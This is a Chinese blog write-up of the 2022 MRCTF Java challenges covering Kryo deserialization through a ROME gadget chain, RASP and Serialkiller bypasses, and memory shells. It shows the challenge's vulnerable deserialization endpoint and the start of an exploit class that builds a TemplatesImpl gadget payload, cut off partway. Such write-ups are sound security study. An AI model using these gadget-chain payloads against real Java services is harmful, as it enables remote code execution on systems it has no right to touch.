<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="2022MRCTF-Java部分总结总的来说是一次非常不错的比赛，这里也会简单列出考点方便查阅学习，不难有点引导性质 Ps：此次比赛都是不出网，所以都需要内存马，内存马部分不做讲解很简单百度搜搜 下面这两题挺不错的也学到了东西，题目做了备份，核心代码(exp)也放到了git仓库备份，本篇只是思路帖子 https:&#x2F;&#x2F;github.com&#x2F;Y4tacker&#x2F;CTFBackup&#x2F;tree&#x2F;main&#x2F;2"><meta property="og:type" content="article"><meta property="og:title" content="2022MRCTF-Java部分"><meta property="og:url" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="2022MRCTF-Java部分总结总的来说是一次非常不错的比赛，这里也会简单列出考点方便查阅学习，不难有点引导性质 Ps：此次比赛都是不出网，所以都需要内存马，内存马部分不做讲解很简单百度搜搜 下面这两题挺不错的也学到了东西，题目做了备份，核心代码(exp)也放到了git仓库备份，本篇只是思路帖子 https:&#x2F;&#x2F;github.com&#x2F;Y4tacker&#x2F;CTFBackup&#x2F;tree&#x2F;main&#x2F;2"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/7.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/8.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/9.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/10.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/11.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/12.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/13.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/14.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/15.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/16.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/18.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/17.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/19.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/20.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/21.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/22.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/23.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/24.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/3.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/4.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/5.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/6.jpg"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/2.png"><meta property="og:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/1.png"><meta property="article:published_time" content="2022-04-24T04:41:06.000Z"><meta property="article:modified_time" content="2024-08-04T09:01:49.222Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="Java"><meta property="article:tag" content="Kryo"><meta property="article:tag" content="Serialkiller"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/7.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>2022MRCTF-Java部分</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2022/04/18/year/2022/4/2022-CTF-Web/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&text=2022MRCTF-Java部分"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&is_video=false&description=2022MRCTF-Java部分"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=2022MRCTF-Java部分&body=Check out this article: https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&name=2022MRCTF-Java部分&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&t=2022MRCTF-Java部分"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022MRCTF-Java%E9%83%A8%E5%88%86"><span class="toc-number">1.</span> <span class="toc-text">2022MRCTF-Java部分</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Springcoffee-%E2%80%93-Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81%E7%BB%95Rasp"><span class="toc-number">1.2.</span> <span class="toc-text">Springcoffee – Kryo反序列化、绕Rasp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">思路分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-Payload%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">具体利用过程(Payload构造过程)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95Rasp"><span class="toc-number">1.2.3.</span> <span class="toc-text">绕Rasp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzJava-%E2%80%93-Bypass-Serialkiller"><span class="toc-number">1.3.</span> <span class="toc-text">EzJava – Bypass Serialkiller</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E8%AF%BB%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">解读环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">1.3.2.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FactoryTransformer"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">FactoryTransformer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-mem-shell-Filter"><span class="toc-number">1.4.</span> <span class="toc-text">Java_mem_shell_Filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-mem-shell-Basic"><span class="toc-number">1.5.</span> <span class="toc-text">Java_mem_shell_Basic</span></a></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">2022MRCTF-Java部分</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2022-04-24T04:41:06.000Z" class="dt-published" itemprop="datePublished">2022-04-24</time> (Updated: <time datetime="2024-08-04T09:01:49.222Z" class="dt-updated" itemprop="dateModified">2024-08-04</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/Java/">Java</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/Kryo/" rel="tag">Kryo</a>, <a class="p-category" href="/tags/Serialkiller/" rel="tag">Serialkiller</a></div></div></header><div class="content e-content" itemprop="articleBody"><h1 id="2022MRCTF-Java部分"><a href="#2022MRCTF-Java部分" class="headerlink" title="2022MRCTF-Java部分"></a>2022MRCTF-Java部分</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说是一次非常不错的比赛，这里也会简单列出考点方便查阅学习，不难有点引导性质</p><p>Ps：此次比赛都是不出网，所以都需要内存马，内存马部分不做讲解很简单百度搜搜</p><p>下面这两题挺不错的也学到了东西，题目做了备份，核心代码(exp)也放到了git仓库备份，本篇只是思路帖子</p><p><a target="_blank" rel="noopener" href="https://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF">https://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF</a></p><p>Springcoffee–Kryo反序列化、绕Rasp</p><p>EzJava–绕Serialkiller黑名单中cc关键组件</p><p>下面这两题没啥参考价值，不过让我搞了下实战也还不错</p><p>Java_mem_shell_Filter–log4j2打jndi</p><p>Java_mem_shell_Basic—tomcat弱口令</p><h2 id="Springcoffee-–-Kryo反序列化、绕Rasp"><a href="#Springcoffee-–-Kryo反序列化、绕Rasp" class="headerlink" title="Springcoffee – Kryo反序列化、绕Rasp"></a>Springcoffee – Kryo反序列化、绕Rasp</h2><p>ok，这东西也是从来没学过，又是从头开始，这里记录了当时是如何思考的分析思考过程</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>首先看看整体目录结构</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/7.png"></p><p>这里挑几个重要的来讲一下<code>CoffeeController</code></p><p>order路由反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/coffee/order&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Message <span class="title">order</span><span class="params">(<span class="meta">@RequestBody</span> CoffeeRequest coffee)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (coffee.extraFlavor != <span class="keyword">null</span>) &#123;</span><br><span class="line">    ByteArrayInputStream bas = <span class="keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(coffee.extraFlavor));</span><br><span class="line">    Input input = <span class="keyword">new</span> Input(bas);</span><br><span class="line">    ExtraFlavor flavor = (ExtraFlavor)<span class="keyword">this</span>.kryo.readClassAndObject(input);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Message(<span class="number">200</span>, flavor.getName());</span><br></pre></td></tr></table></figure><p>demo路由，主要是根据输入修改一些关键配置，这个比较关键之后再说</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/coffee/demo&quot;&#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Message <span class="title">demoFlavor</span><span class="params">(<span class="meta">@RequestBody</span> String raw)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(raw);</span><br><span class="line">        JSONObject serializeConfig = <span class="keyword">new</span> JSONObject(raw);</span><br><span class="line">        <span class="keyword">if</span> (serializeConfig.has(<span class="string">&quot;polish&quot;</span>) &amp;&amp; serializeConfig.getBoolean(<span class="string">&quot;polish&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.kryo = <span class="keyword">new</span> Kryo();</span><br><span class="line">            Method[] var3 = <span class="keyword">this</span>.kryo.getClass().getDeclaredMethods();</span><br><span class="line">            <span class="keyword">int</span> var4 = var3.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">                Method setMethod = var3[var5];</span><br><span class="line">                <span class="keyword">if</span> (setMethod.getName().startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object p1 = serializeConfig.get(setMethod.getName().substring(<span class="number">3</span>));</span><br><span class="line">                        <span class="keyword">if</span> (!setMethod.getParameterTypes()[<span class="number">0</span>].isPrimitive()) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                p1 = Class.forName((String)p1).newInstance();</span><br><span class="line">                                setMethod.invoke(<span class="keyword">this</span>.kryo, p1);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">                                var9.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            setMethod.invoke(<span class="keyword">this</span>.kryo, p1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        Output output = <span class="keyword">new</span> Output(bos);</span><br><span class="line">        <span class="keyword">this</span>.kryo.register(Mocha.class);</span><br><span class="line">        <span class="keyword">this</span>.kryo.writeClassAndObject(output, <span class="keyword">new</span> Mocha());</span><br><span class="line">        output.flush();</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Message(<span class="number">200</span>, <span class="string">&quot;Mocha!&quot;</span>, Base64.getEncoder().encode(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先要解决这道题，我们得知道前人都有一些什么研究</p><p>通过谷歌简单搜索可以搜到一篇文章：<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/">浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641）</a></p><p>其中比较有信息量的是调用栈，但是这里题目环境里面没有依赖</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/8.png"></p><p>但是这里有rome依赖，那么很容易想到EqualsBean去触发ROME的利用链子</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/9.png"></p><h3 id="具体利用过程-Payload构造过程"><a href="#具体利用过程-Payload构造过程" class="headerlink" title="具体利用过程(Payload构造过程)"></a>具体利用过程(Payload构造过程)</h3><p>根据dubbo的利用链进行修改我们可以得到这样的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.util.DefaultInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> fun.mrctf.springcoffee.model.ExtraFlavor;</span><br><span class="line"><span class="keyword">import</span> fun.mrctf.springcoffee.model.Mocha;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.SerializingInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.rowset.BaseRowSet;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Testt</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Kryo kryo = <span class="keyword">new</span> Kryo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">ser</span><span class="params">(String raw)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        JSONObject serializeConfig = <span class="keyword">new</span> JSONObject(raw);</span><br><span class="line">        <span class="keyword">if</span> (serializeConfig.has(<span class="string">&quot;polish&quot;</span>) &amp;&amp; serializeConfig.getBoolean(<span class="string">&quot;polish&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.kryo = <span class="keyword">new</span> Kryo();</span><br><span class="line">            Method[] var3 = <span class="keyword">this</span>.kryo.getClass().getDeclaredMethods();</span><br><span class="line">            <span class="keyword">int</span> var4 = var3.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">                Method setMethod = var3[var5];</span><br><span class="line">                <span class="keyword">if</span> (setMethod.getName().startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object p1 = serializeConfig.get(setMethod.getName().substring(<span class="number">3</span>));</span><br><span class="line">                        <span class="keyword">if</span> (!setMethod.getParameterTypes()[<span class="number">0</span>].isPrimitive()) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                p1 = Class.forName((String)p1).newInstance();</span><br><span class="line">                                setMethod.invoke(<span class="keyword">this</span>.kryo, p1);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">                                var9.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            setMethod.invoke(<span class="keyword">this</span>.kryo, p1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        Output output = <span class="keyword">new</span> Output(bos);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> 